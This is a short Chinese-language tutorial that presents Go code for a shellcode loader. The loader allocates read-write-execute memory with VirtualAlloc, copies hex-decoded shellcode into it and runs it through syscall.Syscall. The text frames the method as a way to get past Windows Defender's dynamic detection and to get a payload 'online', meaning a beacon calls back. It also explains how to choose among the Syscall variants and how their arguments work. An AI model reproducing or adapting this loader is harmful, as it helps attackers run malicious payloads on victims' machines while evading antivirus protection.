【简述】



系统调用技术利用的是Windows API中的syscall函数，在Windows Defender的检测当中，只要你调用此接口，就直接拦截了，这是动态查杀。相比静态查杀，我们常常会对shellcode进行加密，但是其目的终究是调用此接口，所以说，针对动态查杀，bypass的难度相对比静态查杀要大。





【实现思路】


系统调用shellcode的方式很简易，核心代码如下：

func ShellCodeSyscall(shellcode string) {  bshellcode := []byte(shellcode)  Addr, _, _ := VirtualAlloc.Call(0, uintptr(len(bshellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)  AddrPtr := (*[990000]byte)(unsafe.Pointer(Addr))  if ds, err := hex.DecodeString(shellcode); err == nil {    for i, value := range ds {      AddrPtr[i] = value    }  }  syscall.Syscall(Addr, 0, 0, 0, 0)}
Golang的syscall.Syscall系列共有5个方法
syscall.Syscallsyscall.Syscall6syscall.Syscall9syscall.Syscall12syscall.Syscall15


其参数形式为 syscall.Syscall(trap, nargs, a1, a2, a3)
第二个参数，nargs即参数的个数，一旦传错，轻则调用失败，重者直接APPCARSH。APPCRASH是Vista和Win7中特有的故障，就是程序崩溃。然而其它多余的参数，用0代替即可。Addr就是我们申请的虚拟内存空间，系统会调用读取这内存空间的shellcode，从而得到执行上线。
